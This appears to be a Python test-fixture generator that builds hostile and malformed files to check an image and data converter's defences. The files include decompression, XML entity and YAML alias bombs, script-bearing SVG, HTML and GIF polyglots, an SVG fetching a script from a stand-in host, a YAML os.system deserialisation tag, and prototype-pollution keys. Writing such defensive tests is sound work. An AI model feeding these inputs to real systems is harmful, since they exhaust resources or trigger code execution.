#!/usr/bin/env python3
"""Writes the trap files: images that are broken, hostile, or lying, each in one deliberate way.

    fixtures/_tools/make-traps.py

Output goes to fixtures/_traps/, with manifest.json saying what every file is and what must
happen to it. Both test suites read that manifest (fixtures/traps.test.ts in Node,
e2e/traps.spec.ts in three browsers), so adding a trap here is all it takes to have it run.

Everything is built byte by byte with the standard library, and is deterministic: running this
twice writes identical files.
"""
import json
import os
import random
import struct
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
FIXTURES = os.path.dirname(HERE)
OUT = os.path.join(FIXTURES, "_traps")
SIGNATURE = b"\x89PNG\r\n\x1a\n"

manifest = []


# --- PNG building blocks ------------------------------------------------------------------------
def chunk(kind: bytes, data: bytes, crc: int | None = None, length: int | None = None) -> bytes:
    real_crc = zlib.crc32(kind + data) & 0xFFFFFFFF
    return (
        struct.pack(">I", len(data) if length is None else length)
        + kind
        + data
        + struct.pack(">I", real_crc if crc is None else crc)
    )


def ihdr(width, height, depth=8, colour=6, interlace=0) -> bytes:
    return chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, depth, colour, 0, 0, interlace))


def idat(raw: bytes) -> bytes:
    return chunk(b"IDAT", zlib.compress(raw, 9))


IEND = chunk(b"IEND", b"")


def rgba_rows(width, height, rows=None) -> bytes:
    """Scanlines for an 8-bit RGBA picture: a gradient with a transparent corner."""
    raw = bytearray()
    for y in range(height if rows is None else rows):
        raw.append(0)
        for x in range(width):
            alpha = 0 if (x < width // 4 and y < height // 4) else 255
            raw += bytes((255 * x // max(1, width - 1), 255 * y // max(1, height - 1), 160, alpha))
    return bytes(raw)


W, H = 256, 160
GOOD = SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H)) + IEND


# --- manifest ---------------------------------------------------------------------------------
def trap(name, data, why, detect, guard="ok", node="none", browser=None, mismatch=False, group="", note=None, absent=None):
    """
    detect   what identification must say: a format id, 'unregistered', or 'unknown'
    guard    'refused' if the size and pixel guard must stop it before any decode
    node     what libvips in Node must do with it: 'fails', 'succeeds', or 'none' (never reached)
    browser  the same for the app in a browser. Defaults to the Node expectation, and no trap
             differs: a PNG's structure is verified before a browser's own decoder is allowed
             near it, so a forgiving decoder never gets the chance to return half a picture.
    note     the exact reason the app must show, where a generic one will not do
    absent   text that must not appear anywhere in the converted file (a payload hidden in the
             input's metadata, which a conversion must not carry across)
    """
    with open(os.path.join(OUT, name), "wb") as out:
        out.write(data)
    manifest.append(
        {
            "file": name,
            "group": group,
            "why": why,
            "detect": detect,
            "mismatch": mismatch,
            "guard": guard,
            "node": node,
            "browser": node if browser is None else browser,
            "note": note,
            "absent": absent,
        }
    )


def read(*parts) -> bytes:
    with open(os.path.join(FIXTURES, *parts), "rb") as source:
        return source.read()


os.makedirs(OUT, exist_ok=True)
for stale in os.listdir(OUT):
    if stale != "README.md":
        os.remove(os.path.join(OUT, stale))

# === 1. Files that are not what they say ============================================================
G = "identity"
trap("empty.png", b"", "Zero bytes.", "unknown", group=G)
trap("text.png", b"This is a text file, not an image.\n", "Plain text with an image name.", "unknown", group=G)
trap(
    "random-bytes.png",
    random.Random(20261122).randbytes(4096),
    "4 KB of noise: no signature of any kind.",
    "unknown",
    group=G,
)
trap(
    "svg-with-script.png",
    b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script></svg>\n',
    "An SVG carrying a script, named as a PNG. It is drawn as the SVG it is, and the script is "
    "never run.",
    "svg",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "jpeg-named.png",
    read("jpeg", "sample.jpg"),
    "A real JPEG with a .png name. The contents win over the name, and it converts as a JPEG.",
    "jpeg",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "webp-named.png",
    read("webp", "sample.webp"),
    "A real WebP with a .png name. It converts as the WebP it is.",
    "webp",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "gif-named.png",
    read("gif", "sample.gif"),
    "A real GIF with a .png name. It converts as the GIF it is.",
    "gif",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "png-named.jpg",
    GOOD,
    "A sound PNG with a .jpg name. It must convert as the PNG it is.",
    "png",
    node="succeeds",
    mismatch=True,
    group=G,
)

# === 2. Files that lie about their size ============================================================
G = "size"
bmp_huge = bytearray(read("bmp", "sample.bmp"))
bmp_huge[18:26] = struct.pack("<ii", 50000, 50000)
trap(
    "huge-declared.bmp",
    bytes(bmp_huge),
    "A small BMP whose header states 50,000 pixels a side. Refused from the header.",
    "bmp",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.qoi",
    b"qoif" + struct.pack(">II", 50000, 50000) + bytes([4, 0]) + bytes(7) + b"\x01",
    "Twenty-two bytes of QOI that state 50,000 pixels a side. Refused from the header.",
    "qoi",
    guard="refused",
    group=G,
)
psd_huge = bytearray(read("psd", "sample.psd"))
psd_huge[14:22] = struct.pack(">II", 300000, 300000)
trap(
    "huge-declared.psd",
    bytes(psd_huge),
    "A Photoshop file whose header states 300,000 pixels a side, ten times what the format allows.",
    "psd",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.pnm",
    b"P6\n# a comment\n50000 50000\n255\n" + bytes(64),
    "Thirty bytes of Netpbm text that state 50,000 pixels a side. Refused from the header.",
    "pnm",
    guard="refused",
    group=G,
)
tga_huge = bytearray(read("tga", "sample.tga"))
tga_huge[12:16] = struct.pack("<HH", 65535, 65535)
trap(
    "huge-declared.tga",
    bytes(tga_huge),
    "A small TGA whose header states 65,535 pixels a side, the most the format can say.",
    "tga",
    guard="refused",
    group=G,
)
trap(
    "huge-declared.svg",
    b'<svg xmlns="http://www.w3.org/2000/svg" width="200000" height="200000"><rect width="10" height="10"/></svg>\n',
    "A hundred bytes of SVG that state a size of forty thousand megapixels. Refused from the "
    "stated size, before anything is drawn.",
    "svg",
    guard="refused",
    group=G,
)
trap(
    "declares-30000x30000.png",
    SIGNATURE + ihdr(30000, 30000),
    "33 bytes. The header claims 900 megapixels; there are no pixels at all.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "declares-max-size.png",
    SIGNATURE + ihdr(0xFFFFFFFF, 0xFFFFFFFF),
    "The header claims the largest size a PNG header can express.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "declares-zero-size.png",
    SIGNATURE + ihdr(0, 0) + idat(b"") + IEND,
    "The header claims 0 x 0.",
    "png",
    node="fails",
    group=G,
)
# A genuine decompression bomb: a valid, complete, 49 KB file that decodes to 400 megapixels.
# One bit a pixel, all zero, so it deflates to almost nothing; as RGBA it would need 1.6 GB.
BOMB = 20000
bomb_row = b"\x00" + bytes(BOMB // 8)
squeeze = zlib.compressobj(9)
bomb_data = b"".join(squeeze.compress(bomb_row) for _ in range(BOMB)) + squeeze.flush()
trap(
    "bomb-20000x20000.png",
    SIGNATURE + ihdr(BOMB, BOMB, depth=1, colour=0) + chunk(b"IDAT", bomb_data) + IEND,
    "A real decompression bomb: a valid file of a few kilobytes that decodes to 400 megapixels. "
    "It must be refused from its header, never decoded.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "too-wide-for-webp.png",
    SIGNATURE + ihdr(20000, 8) + idat((b"\x00" + bytes(20000 * 4)) * 8) + IEND,
    "A valid, small picture 20000 pixels wide. WebP cannot hold anything wider than 16383. "
    "Chrome's encoder quietly returns a 16383-pixel picture instead of failing, so the app must "
    "refuse first and say why.",
    "png",
    node="fails",
    note="Too large for WebP, which holds 16383 pixels a side at most",
    group=G,
)

# === 3. Files that start well and go wrong ==========================================================
G = "damage"
trap(
    "signature-only.png",
    SIGNATURE,
    "The eight-byte PNG signature and nothing after it. Too little to call a PNG.",
    "unknown",
    group=G,
)
trap(
    "truncated.png",
    GOOD[: len(GOOD) * 6 // 10],
    "A sound PNG cut off 60% of the way through.",
    "png",
    node="fails",
    group=G,
)
trap(
    "no-image-data.png",
    SIGNATURE + ihdr(W, H) + IEND,
    "A header and an end marker with no image data between them.",
    "png",
    node="fails",
    group=G,
)
trap(
    "short-image-data.png",
    SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H, rows=H // 2)) + IEND,
    "Well-formed, but holds only half the rows its header promises.",
    "png",
    node="fails",
    group=G,
)
good_idat = zlib.compress(rgba_rows(W, H), 9)
broken = bytearray(good_idat)
broken[len(broken) // 3 : len(broken) // 3 + 64] = b"\xff" * 64
trap(
    "corrupt-image-data.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", bytes(broken)) + IEND,
    "The compressed image data is overwritten part-way through. The checksum is correct, so only "
    "decompressing it reveals the damage.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-checksum.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", good_idat, crc=0xDEADBEEF) + IEND,
    "The image data is intact but its checksum is wrong.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-bit-depth.png",
    SIGNATURE + ihdr(W, H, depth=3) + idat(rgba_rows(W, H)) + IEND,
    "The header declares a bit depth (3) that PNG does not allow.",
    "png",
    node="fails",
    group=G,
)
trap(
    "bad-colour-type.png",
    SIGNATURE + ihdr(W, H, colour=9) + idat(rgba_rows(W, H)) + IEND,
    "The header declares a colour type (9) that does not exist.",
    "png",
    node="fails",
    group=G,
)
bad_filter = bytearray(rgba_rows(W, H))
for row in range(H):
    bad_filter[row * (W * 4 + 1)] = 9
trap(
    "bad-filter-type.png",
    SIGNATURE + ihdr(W, H) + idat(bytes(bad_filter)) + IEND,
    "Every row is marked with a filter type (9) that does not exist.",
    "png",
    node="fails",
    group=G,
)
trap(
    "chunk-length-overflow.png",
    SIGNATURE + ihdr(W, H) + chunk(b"IDAT", good_idat[:64], length=0xFFFFFFF0) + IEND,
    "A chunk claims to be four gigabytes long. A reader that trusts it reads past the end. "
    "Identification runs off the end of the file looking for the next chunk and gives up.",
    "unknown",
    group=G,
)
trap(
    "header-not-first.png",
    SIGNATURE + idat(rgba_rows(W, H)) + ihdr(W, H) + IEND,
    "The image data comes before the header that describes it.",
    "png",
    node="fails",
    group=G,
)
trap(
    "metadata-bomb.png",
    SIGNATURE
    + ihdr(W, H)
    + chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(bytes(50 * 1024 * 1024), 9))
    + idat(rgba_rows(W, H))
    + IEND,
    "A sound picture carrying a compressed comment that expands to 50 MB. The picture must "
    "convert without the comment being inflated into memory to no purpose.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "no-end-marker.png",
    SIGNATURE + ihdr(W, H) + idat(rgba_rows(W, H)),
    "Complete image data, but the file stops before the end marker. Every decoder accepts it.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "trailing-garbage.png",
    GOOD + random.Random(7).randbytes(10000),
    "A sound PNG followed by 10 KB of noise. The picture is whole; the tail must be ignored.",
    "png",
    node="succeeds",
    group=G,
)

# AVIF and JPEG XL, read by libvips's optional modules. Each must refuse what is damaged too.
for folder, ext, label in (("avif", "avif", "AVIF"), ("jxl", "jxl", "JPEG XL")):
    sound = read(folder, f"sample.{ext}")
    trap(
        f"truncated.{ext}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
    )
    flipped = bytearray(sound)
    for i in range(len(flipped) - 400, len(flipped) - 300):
        flipped[i] ^= 0xFF
    trap(
        f"corrupt-data.{ext}",
        bytes(flipped),
        f"A sound {label} file with a hundred bytes of its picture data inverted.",
        ext,
        node="fails",
        group=G,
    )

# HEIC, decoded by libheif. A file cut short is refused. One whose compressed data is altered is
# not always: HEVC carries no checksum, so the decoder cannot tell, and returns a damaged picture.
heic_sound = read("heic", "sample.heic")
trap(
    "truncated.heic",
    heic_sound[: len(heic_sound) // 2],
    "A sound HEIC file cut off halfway through.",
    "heic",
    node="fails",
    group=G,
)

# The formats ImageMagick reads. Each is cut off halfway; each must be refused, not half-drawn.
for folder, ext, label in (
    ("bmp", "bmp", "BMP"),
    ("qoi", "qoi", "QOI"),
    ("psd", "psd", "Photoshop"),
    ("ico", "ico", "icon"),
    ("jp2", "jp2", "JPEG 2000"),
):
    sound = read(folder, f"sample.{ext}")
    trap(
        f"truncated.{ext}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
        note="This file is damaged: a part of the file is longer than the file" if ext == "psd" else None,
    )
for folder, name, ext, label in (
    ("tga", "sample.tga", "tga", "TGA"),
    ("pnm", "sample.ppm", "pnm", "Netpbm"),
    ("pcx", "sample.pcx", "pcx", "PCX"),
    ("sgi", "sample.sgi", "sgi", "SGI"),
    ("ras", "sample.ras", "ras", "Sun Raster"),
    ("hdr", "sample.hdr", "hdr", "Radiance HDR"),
    ("exr", "sample.exr", "exr", "OpenEXR"),
    ("svgz", "sample.svgz", "svgz", "SVGZ"),
):
    sound = read(folder, name)
    trap(
        f"truncated.{name.split('.')[1]}",
        sound[: len(sound) // 2],
        f"A sound {label} file cut off halfway through.",
        ext,
        node="fails",
        group=G,
    )


def gzip_bytes(parts) -> bytes:
    """Gzip, with no name or time in the header, so the file is the same on every run."""
    squeeze = zlib.compressobj(9, zlib.DEFLATED, 31)
    return b"".join(squeeze.compress(part) for part in parts) + squeeze.flush()


trap(
    "gzip-bomb.svgz",
    gzip_bytes(
        [b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">']
        + [b" " * (1 << 20)] * 256
        + [b"</svg>\n"]
    ),
    "A quarter of a megabyte that unpacks to a quarter of a gigabyte of spaces inside an SVG. "
    "Unpacking must stop at a limit, and the file be refused.",
    "svgz",
    node="fails",
    group=G,
)
trap(
    "gzip-of-text.svgz",
    gzip_bytes([b"Not a drawing, only some text that has been compressed.\n"]),
    "A gzip file with an .svgz name that does not hold an SVG. It is a gzip file, and no more.",
    "unregistered",
    group=G,
)
ico_sound = bytearray(read("ico", "sample.ico"))
ico_sound[18:22] = struct.pack("<I", 0x7FFFFFF0)  # where the first picture is said to start
trap(
    "bad-offset.ico",
    bytes(ico_sound),
    "An icon whose directory points two gigabytes past the end of the file for its picture.",
    "ico",
    node="fails",
    group=G,
)

# SVG, drawn by resvg. It is text, so the ways it goes wrong are a parser's.
SVG_OPEN = b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
trap(
    "unclosed.svg",
    SVG_OPEN + b'<rect width="10" height="10"',
    "An SVG that stops in the middle of a tag.",
    "svg",
    node="fails",
    group=G,
)
use_bomb = b'<g id="a0"><rect width="1" height="1"/></g>'
for level in range(1, 9):
    use_bomb += f'<g id="a{level}">'.encode() + f'<use href="#a{level - 1}"/>'.encode() * 10 + b"</g>"
trap(
    "use-bomb.svg",
    SVG_OPEN + b"<defs>" + use_bomb + b'</defs><use href="#a8"/></svg>\n',
    "A few hundred bytes of shapes that each draw the one before ten times: a hundred million "
    "rectangles if followed. The reader must stop counting and refuse.",
    "svg",
    node="fails",
    group=G,
)
trap(
    "self-reference.svg",
    SVG_OPEN + b'<g id="x"><rect width="8" height="8"/><use href="#x"/></g></svg>\n',
    "A shape that draws itself. The reader must break the loop, not follow it.",
    "svg",
    node="succeeds",
    group=G,
)
trap(
    "html-named.svg",
    b"<!DOCTYPE html>\n<html><body><svg></svg><script>alert(1)</script></body></html>\n",
    "A web page with an .svg name. Its root is not <svg>, so it is not an SVG: it is a web "
    "page, and one with a script and no words in it.",
    "html",
    node="fails",
    mismatch=True,
    note="This file has no text in it to convert",
    group=G,
)

# === 4. Sound files in shapes a careless reader gets wrong ============================================
G = "unusual"
deep = bytearray()
for y in range(40):
    deep.append(0)
    for x in range(64):
        deep += struct.pack(">HHHH", 65535 * x // 63, 65535 * y // 39, 40000, 65535)
trap(
    "sixteen-bit.png",
    SIGNATURE + ihdr(64, 40, depth=16) + idat(bytes(deep)) + IEND,
    "Valid, 16 bits a channel.",
    "png",
    node="succeeds",
    group=G,
)
indexed = bytearray()
for y in range(40):
    indexed.append(0)
    indexed += bytes((x // 16 + y // 10) % 4 for x in range(64))
trap(
    "palette-with-transparency.png",
    SIGNATURE
    + ihdr(64, 40, colour=3)
    + chunk(b"PLTE", bytes((59, 108, 255, 244, 244, 242, 13, 13, 13, 255, 0, 0)))
    + chunk(b"tRNS", bytes((255, 255, 255, 0)))
    + idat(bytes(indexed))
    + IEND,
    "Valid, four-colour palette, one colour fully transparent.",
    "png",
    node="succeeds",
    group=G,
)
bits = bytearray()
for y in range(40):
    bits.append(0)
    bits += bytes(0b10101010 if y % 2 else 0b01010101 for _ in range(8))
trap(
    "one-bit-grey.png",
    SIGNATURE + ihdr(64, 40, depth=1, colour=0) + idat(bytes(bits)) + IEND,
    "Valid, one bit a pixel.",
    "png",
    node="succeeds",
    group=G,
)


# ================================================================================================
# Second batch: adversarial files. Each reproduces the *shape* of an attack on an image reader
# (resource exhaustion, an index or length that points outside its table, a payload smuggled in
# metadata, a file that is two formats at once) without containing anything harmful itself.
# ================================================================================================

SMALL_W, SMALL_H = 64, 40
SMALL = rgba_rows(SMALL_W, SMALL_H)
PAYLOAD = "OMSETT-TRAP-PAYLOAD"

# --- more files that are not what they say --------------------------------------------------------
G = "identity"
trap(
    "gif-header-then-script.png",
    b"GIF89a" + b"/*" + bytes(20) + b"*/=1;<script>alert(1)</script>",
    "The classic two-in-one: bytes that open like a GIF and continue as a script. Identified as "
    "the GIF it opens as, refused as a broken one, and never run.",
    "gif",
    node="fails",
    mismatch=True,
    group=G,
)
trap(
    "entity-expansion.svg",
    b'<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa">'
    + b"".join(
        f'<!ENTITY {chr(98 + i)} "{("&" + chr(97 + i) + ";") * 10}">'.encode() for i in range(8)
    )
    + b']>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&i;</text></svg>\n',
    "An XML entity bomb (\"billion laughs\"): a kilobyte that expands to a gigabyte of text if "
    "parsed. The SVG reader must notice the loop and refuse.",
    "svg",
    node="fails",
    group=G,
)
trap(
    "svg-fetches-elsewhere.svg",
    b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">'
    b'<image xlink:href="https://example.invalid/track.png" width="1" height="1"/>'
    b'<script xlink:href="https://example.invalid/x.js"/></svg>\n',
    "An SVG that asks for a picture and a script from another site. It is drawn without them, "
    "and nothing may be requested.",
    "svg",
    node="succeeds",
    group=G,
)
trap(
    "utf16-text.png",
    "﻿This is text in UTF-16, with a byte-order mark.\n".encode("utf-16"),
    "Text in an encoding whose first bytes can be mistaken for a binary signature.",
    "unknown",
    group=G,
)
trap(
    "png-then-zip.png",
    GOOD + b"PK\x03\x04" + bytes(26) + b"PK\x05\x06" + bytes(18),
    "A sound PNG with a ZIP archive attached to its end: one file, two formats. It is the PNG "
    "it opens as, and only the picture is converted.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "script-in-metadata.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H)
    + chunk(b"tEXt", b"Comment\x00<script>alert('" + PAYLOAD.encode() + b"')</script>")
    + chunk(
        b"iTXt",
        b"XML:com.adobe.xmp\x00\x00\x00\x00\x00"
        + b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>'
        + PAYLOAD.encode()
        + b"</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>",
    )
    + chunk(
        b"eXIf",
        b"MM\x00\x2a\x00\x00\x00\x08\x00\x01\x01\x0e\x00\x02"
        + struct.pack(">II", len(PAYLOAD) + 1, 26)
        + bytes(4)
        + PAYLOAD.encode()
        + b"\x00",
    )
    + idat(SMALL)
    + IEND,
    "A sound picture whose comment, XMP and EXIF metadata all carry a marked payload, one of "
    "them a script. The picture converts; none of the payload may reach the output, whichever "
    "engine does the work.",
    "png",
    node="succeeds",
    absent=PAYLOAD,
    group=G,
)

# --- more files that lie about their size ----------------------------------------------------------
G = "size"
trap(
    "rowbytes-overflow.png",
    SIGNATURE + ihdr(0x40000000, 1, depth=16),
    "One row, a billion pixels wide at 16 bits a channel: eight gigabytes for a single row, a "
    "size that overflows the 32-bit arithmetic older readers used for it.",
    "png",
    guard="refused",
    group=G,
)
trap(
    "sign-bit-size.png",
    SIGNATURE + ihdr(0x80000000, 0x80000000),
    "A width and height with the top bit set, which a reader that treats them as signed numbers "
    "sees as negative.",
    "png",
    guard="refused",
    group=G,
)
tall = 100000
squeeze = zlib.compressobj(9)
tall_data = b"".join(squeeze.compress(b"\x00\x00") for _ in range(tall)) + squeeze.flush()
trap(
    "tall-1x100000.png",
    SIGNATURE + ihdr(1, tall, depth=1, colour=0) + chunk(b"IDAT", tall_data) + IEND,
    "Valid, one pixel wide and a hundred thousand tall. Tiny in pixels, so the size guard lets "
    "it through; far taller than WebP can hold, so the target must refuse it.",
    "png",
    node="fails",
    note="Too large for WebP, which holds 16383 pixels a side at most",
    group=G,
)
big = 8000
big_row = b"\x00" + bytes(big // 8)
squeeze = zlib.compressobj(9)
big_data = b"".join(squeeze.compress(big_row) for _ in range(big)) + squeeze.flush()
trap(
    "large-8000x8000.png",
    SIGNATURE + ihdr(big, big, depth=1, colour=0) + chunk(b"IDAT", big_data) + IEND,
    "Valid and genuinely large: 64 megapixels in a file of a few kilobytes. Allowed by the guard "
    "and too big for the canvas engine, so it must be handed to libvips and convert, without "
    "the tab running out of memory.",
    "png",
    node="succeeds",
    group=G,
)

# --- more damage: the shapes that have broken image readers before ---------------------------------
G = "damage"
bad_adler = bytearray(zlib.compress(SMALL, 9))
bad_adler[-4:] = b"\xde\xad\xbe\xef"
trap(
    "inner-checksum-wrong.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"IDAT", bytes(bad_adler)) + IEND,
    "The outer checksum is right; the one inside the compressed data, which is only checked "
    "after everything has been decompressed, is wrong.",
    "png",
    node="fails",
    group=G,
)
trap(
    "too-much-image-data.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + idat(SMALL + SMALL) + IEND,
    "Twice as many rows as the header declares. A reader that writes what it is given, instead "
    "of what it allocated for, writes past the end of its buffer.",
    "png",
    node="succeeds",
    group=G,
)
out_of_range = b"".join(b"\x00" + bytes([200]) * SMALL_W for _ in range(SMALL_H))
trap(
    "palette-index-out-of-range.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255)))
    + idat(out_of_range)
    + IEND,
    "A two-colour palette, and pixels that all ask for colour number 200. A reader that looks "
    "it up without checking reads memory that is not the palette.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "palette-wrong-length.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255, 7)))
    + idat(b"".join(b"\x00" + bytes(SMALL_W) for _ in range(SMALL_H)))
    + IEND,
    "A palette of seven bytes. Colours take three bytes each, so the last one is cut short.",
    "png",
    node="fails",
    group=G,
)
trap(
    "transparency-longer-than-palette.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H, colour=3)
    + chunk(b"PLTE", bytes((255, 0, 0, 0, 0, 255)))
    + chunk(b"tRNS", bytes(256))
    + idat(b"".join(b"\x00" + bytes(SMALL_W) for _ in range(SMALL_H)))
    + IEND,
    "Two colours in the palette, and 256 transparency entries for them.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "unknown-critical-chunk.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"CRIT", b"must be understood") + idat(SMALL) + IEND,
    "Contains a chunk marked as essential that no reader knows. The format says a reader that "
    "does not understand an essential chunk must give up.",
    "png",
    node="fails",
    group=G,
)
trap(
    "interlace-flag-lies.png",
    SIGNATURE
    + chunk(b"IHDR", struct.pack(">IIBBBBB", SMALL_W, SMALL_H, 8, 6, 0, 0, 1))
    + idat(SMALL)
    + IEND,
    "The header says the rows are interlaced; the data is laid out as if they were not.",
    "png",
    node="fails",
    group=G,
)
trap(
    "colour-profile-bomb.png",
    SIGNATURE
    + ihdr(SMALL_W, SMALL_H)
    + chunk(b"iCCP", b"bomb\x00\x00" + zlib.compress(bytes(64 * 1024 * 1024), 9))
    + idat(SMALL)
    + IEND,
    "A sound picture with a colour profile that expands to 64 MB of nothing. Unlike a comment, "
    "a profile is something a reader wants to load.",
    "png",
    node="succeeds",
    group=G,
)
whole = zlib.compress(SMALL, 9)
trap(
    "image-data-in-single-bytes.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + b"".join(chunk(b"IDAT", whole[i : i + 1]) for i in range(len(whole))) + IEND,
    "Valid, with the image data split into one chunk per byte: thousands of chunks, each with "
    "its own header and checksum, to make a reader do a great deal of work for very little.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "five-thousand-comments.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + b"".join(chunk(b"tEXt", b"k%04d\x00v" % i) for i in range(5000)) + idat(SMALL) + IEND,
    "Valid, with five thousand comments ahead of the picture.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "zero-gamma.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"gAMA", struct.pack(">I", 0)) + idat(SMALL) + IEND,
    "Declares a gamma of zero, which a reader that applies it divides by.",
    "png",
    node="succeeds",
    group=G,
)
trap(
    "claims-a-million-frames.png",
    SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"acTL", struct.pack(">II", 1_000_000, 0)) + idat(SMALL) + IEND,
    "Announces itself as an animation of a million frames and contains one picture. A reader "
    "that allocates per announced frame runs out of memory.",
    "apng",
    node="succeeds",
    group=G,
)

# --- one more sound file a careless reader gets wrong ----------------------------------------------
G = "unusual"


def adam7(width, height):
    """The same gradient as rgba_rows, laid out in the seven passes of an interlaced PNG."""
    raw = bytearray()
    passes = ((0, 0, 8, 8), (4, 0, 8, 8), (0, 4, 4, 8), (2, 0, 4, 4), (0, 2, 2, 4), (1, 0, 2, 2), (0, 1, 1, 2))
    for x0, y0, dx, dy in passes:
        if x0 >= width:
            continue
        for y in range(y0, height, dy):
            raw.append(0)
            for x in range(x0, width, dx):
                raw += bytes((255 * x // max(1, width - 1), 255 * y // max(1, height - 1), 160, 255))
    return bytes(raw)


trap(
    "interlaced.png",
    SIGNATURE
    + chunk(b"IHDR", struct.pack(">IIBBBBB", SMALL_W, SMALL_H, 8, 6, 0, 0, 1))
    + idat(adam7(SMALL_W, SMALL_H))
    + IEND,
    "Valid, with its rows interlaced in seven passes, the way PNGs were saved for slow "
    "connections.",
    "png",
    node="succeeds",
    group=G,
)

# --- data: JSON, YAML, TOML, XML, CSV ---------------------------------------------------------
# These are text, read by parsers. What goes wrong is a parser's trouble: input that never
# ends, input that grows when read, input that asks to be run, and names that mean something
# to the language doing the reading. Each is converted to JSON (a JSON file, to YAML).
G = "data"

trap(
    "truncated.json",
    b'[\n  {"id": 1, "name": "Ada"},\n  {"id": 2, "name": ',
    "A JSON file that stops in the middle of a value, as a download cut short does.",
    "json",
    node="fails",
    note="This file is not valid JSON",
    group=G,
)
trap(
    "nested-300-deep.json",
    b"[" * 300 + b"]" * 300 + b"\n",
    "Three hundred lists, each inside the last. Valid, and far deeper than anything written "
    "by hand; much deeper and whatever walks it runs out of stack.",
    "json",
    node="fails",
    note="The values in this file are nested too deeply",
    group=G,
)
trap(
    "proto-names.json",
    b'{\n  "__proto__": {"polluted": true},\n  "constructor": {"prototype": {"polluted": true}},\n'
    b'  "toString": "not a function",\n  "rows": [1, 2, 3]\n}\n',
    "Names that mean something to JavaScript. A careless reader lets them change how every "
    "object in the program behaves; here they are only names.",
    "json",
    node="succeeds",
    group=G,
)
trap(
    "byte-order-mark.json",
    b'\xef\xbb\xbf{"name": "Ada", "born": 1815}\n',
    "Valid JSON behind the three invisible bytes some Windows programs put at the start of a "
    "text file.",
    "json",
    node="succeeds",
    group=G,
)
trap(
    "utf-16.json",
    '{"name": "Ada"}\n'.encode("utf-16"),
    "JSON saved as UTF-16, two bytes to a character. These formats are read as UTF-8 only, so "
    "this is not recognised as text at all.",
    "unknown",
    group=G,
)

alias_bomb = "a: &a [x, x, x, x, x, x, x, x, x]\n"
for i, name in enumerate("bcdefghi"):
    previous = "a" if i == 0 else "bcdefghi"[i - 1]
    alias_bomb += f"{name}: &{name} [{', '.join(['*' + previous] * 9)}]\n"
trap(
    "alias-bomb.yaml",
    alias_bomb.encode(),
    'The "billion laughs": nine short lists, each made of nine copies of the one before. Under '
    "a kilobyte as written, hundreds of millions of values if every copy is followed.",
    "yaml",
    node="fails",
    note="This file is not valid YAML",
    group=G,
)
trap(
    "asks-to-run-code.yaml",
    b'run: !!python/object/apply:os.system ["echo owned"]\n'
    b'call: !!js/function "function () { return 1 }"\n'
    b"plain: stays\n",
    "Tags that, in a careless reader, build objects or call functions as the file is read. "
    "Here a tag builds nothing, and what it was attached to is kept as text.",
    "yaml",
    node="succeeds",
    group=G,
)
trap(
    "unclosed-list.yaml",
    b"name: Ada\nfields: [mathematics, computing\nborn: 1815\n",
    "A list that is opened and never closed.",
    "yaml",
    node="fails",
    note="This file is not valid YAML",
    group=G,
)

trap(
    "same-name-twice.toml",
    b'name = "Ada"\nname = "Grace"\n',
    "One name given two values, which TOML forbids. A reader that quietly keeps one of them "
    "has thrown data away without saying so.",
    "toml",
    node="fails",
    note="This file is not valid TOML",
    group=G,
)
trap(
    "unfinished-text.toml",
    b'title = "People"\nnote = "never closed\n',
    "A quoted value with no closing quote.",
    "toml",
    node="fails",
    note="This file is not valid TOML",
    group=G,
)

